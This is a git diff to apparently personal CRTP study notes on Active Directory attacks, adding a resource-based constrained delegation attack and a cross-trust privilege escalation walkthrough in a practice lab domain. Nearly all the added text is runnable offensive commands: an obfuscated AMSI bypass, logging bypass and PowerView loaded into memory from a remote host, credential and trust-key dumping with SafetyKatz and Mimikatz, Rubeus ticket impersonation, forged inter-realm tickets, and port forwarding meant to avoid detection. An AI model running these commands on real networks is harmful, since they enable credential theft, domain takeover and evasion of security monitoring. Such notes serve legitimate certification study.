@@ -2220,7 +2220,7 @@ This technique will create a fake device, specify a specific password for it, an
 
 After that, we will use the Rubeus tool, so that we request any service on the target device, such as http in order to set up PS Remoting, or cifs in order to browse the files of the target device or host in order to implement scheduling tasks, and we obtain a Reverse Shell or ldap if the target device is the DC, so that it withdraws the hash. Private in Domain Admins and implement the Pass the Hash technique, and all of these requests will be through the fake device.
 
-### Attack
+### Attack 1
 1. I'm using a HRmanager user
 
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2c0e0661-d231-456c-9068-08b8fa32c630)
@@ -2295,3 +2295,99 @@ Enter-PSSession jehaddc.cyber.local
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2e859f3e-1943-4296-862e-846e1033966d)
 
+### Attack 2
+1. Bypass Script Block login
+```
+iex (iwr http://10.0.10.16/sbloggingbypass.txt-UseBasicParsing)
+```
+2. Bypass AMSI
+```
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+3. Load PowerView on memory
+```
+iex ((New-Object Net.WebClient).DownloadString('http://10.10.10.6/PowerView.ps1')
+```
+4. configure the deletation from student1$ to dcorp-mgmt
+```
+Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom  'dcorp-student1$'
+```
+5. check for RBCD
+```
+Get-DomainRBCD
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2024e44f-de45-423c-9704-5c9267359314)
+
+you can read the above screenshot as following
+
+if I compromise the `"DCORP-STUDENT1"` machine (in DelegatedDistinguishedName). you will be able to access any service as any user in DORP-MGMT$ (in SourceName) including the domain admin
+6. extract the secrets from memory
+```
+SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/97c41297-a7d1-473e-9f25-f62cbf8de6f4)
+
+if you notice there are two dcorp-students1$ accounts, which one will you use? you need to check the SID the first one `"S-1-5-96-0-19"` is well known for the virtual machines that computers are making. however, the second SID `"S-1-5-18"` is known for the original account (not VM). we will take the aes256 of the second one
+
+7. inject an http ticket using Rubeus
+```
+Rubeus.exe s4u /user:dcorp-student1$ /aes256:<aes256OfWebsvcUser> /impersonateuser:Administrator /msdsspn:http/dorp-mgmt /ptt
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/66281f0f-b992-41ff-9d8a-a271d8b10800)
+
+8. access the administrator
+```
+winrs -r:dcorp-mgmt cmd
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c09e5f11-12c4-4795-8ad2-b70dae9b668f)
+
+# Priv Esc - Across Trusts
+1. Start a cmd process as svcadmin
+```
+Rubues.exe asktgt /user:svcadmin /aes:<aes256>
+```
+2. transfer loader.exe to the svcadmin
+```
+xcopy loader.exe \\dcorp-dc\C$\Users/Public/Loader.exe /Y
+```
+Type F in the question
+
+3. run winrs to access the DC
+```
+winrs -r:dcorp-dc cmd
+```
+4. configure port forwarding to avoid detection
+```
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1
+```
+don't forget to run hfs.exe and put safetykatz.exe there
+5. run SafetyKatz on memory
+```
+Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
+```
+6. extract the trust key
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc"'
+#OR
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
+SafetyKatz.exe "lsadump::dcsync /user:scorp\mcorp$" "exit"
+#OR
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/75432d19-2f7b-4c1a-8419-683c0936c6f1)
+
+This is the trust key
+
+7. forge TGS
+```
+BetterSafetyKatz.exe "Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /sids:<SIDs> /rc4:<TrustKey> /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7ff2dc4a-bf72-4fbb-99ca-1841f1326b17)
+
+8. use Rubeus to reqeust TGS using the ticket that we forged
+```
+Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi \service:cifs\mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
+klist
+dir \\mcorp-dc.moneycorp.local\C$
+```
+now you can access the shared file of the enterprise admin
